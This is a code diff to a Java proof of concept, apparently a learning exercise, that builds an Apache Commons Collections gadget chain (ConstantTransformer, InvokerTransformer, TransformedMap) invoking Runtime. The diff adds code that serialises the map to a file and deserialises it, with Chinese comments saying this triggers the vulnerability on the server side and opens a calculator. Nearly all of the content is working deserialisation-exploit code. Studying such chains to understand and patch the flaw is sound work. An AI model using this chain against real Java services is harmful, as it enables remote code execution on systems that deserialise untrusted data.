@@ -6,12 +6,14 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.TransformedMap;
 
+import java.io.*;
 import java.util.HashMap;
 import java.util.Map;
 
+
 public class UseTransformedMap {
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
         // 使用Class类来执行
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -34,8 +36,26 @@ public class UseTransformedMap {
         Map myMap = TransformedMap.decorate(map,null,chainedTransformer);
 //        Map myMap = TransformedMap.decorate(map,chainedTransformer,null);
 
+        //序列化
+        FileOutputStream fileOutputStream = new FileOutputStream("tm.cer");
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(myMap);
+        objectOutputStream.flush();
+        objectOutputStream.close();
+        fileOutputStream.close();
+
+        /*
+         * 服务端反序列化读取，并触发漏洞
+         * */
+        //反序列化
+        FileInputStream fileInputStream = new FileInputStream("tm.cer");
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        Map mapObj = (Map) objectInputStream.readObject();
+        //触发漏洞
         // 这一步会弹出计算器
-        myMap.put("key2", "value2");
+        mapObj.put("key2", "value2");
+
+
 
 
 
